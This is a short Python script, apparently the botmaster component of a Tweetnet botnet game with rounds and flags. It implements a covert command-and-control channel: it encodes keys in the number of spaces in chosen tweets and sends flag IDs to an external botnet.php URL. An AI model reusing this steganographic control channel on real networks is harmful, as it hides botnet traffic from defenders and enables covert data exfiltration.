import sys
import time
import random
import requests
import botnet_utils as utils

from tweetnet import Tweetnet

def get_random_tweet(api):
    """
    returns random tweet from all tweets
    """
    tweets = api.get_tweets();
    if (tweets):
        return tweets[int(random.random() * len(tweets))];
    return "";

if __name__ == "__main__":
    round_id = sys.argv[1]
    user = sys.argv[2]

    api = Tweetnet(round_id, role='admin')

    # Last check for flags
    last_check = 0
    already = set()

    while True:
        print "Checking for new flags...";
        flags = api.get_flags(since=last_check);
        last_check = int(time.time()) - 1;

        # Is it a 'sweetspot' for sending a tweet?
        # The 'sweetspot' is used by bot to 
        # determine validity of master.
        if utils.sweet_spot(last_check):
            random_tweet = get_random_tweet(api);
            api.tweet(user, random_tweet['content'].strip());
        if flags:
            for flag in flags:
                # When flag appears, botmaster
                # dumps content at URL with specific
                # key.  This key is communicated to 
                # bots via Twitter.
                random_content = " "*200;
                while (len(random_content) >= 140):
                    random_content = get_random_tweet(api)['content'];
                num_spaces = random_content.count(' ');
                payload = {'name': 'master', 'key': str(num_spaces + 1), 'val': flag['flag_id']};
                r = requests.get("http://ofir.scripts.mit.edu/botnet.php", params=payload)
                api.tweet(user, random_content + ' ');
        time.sleep(3)
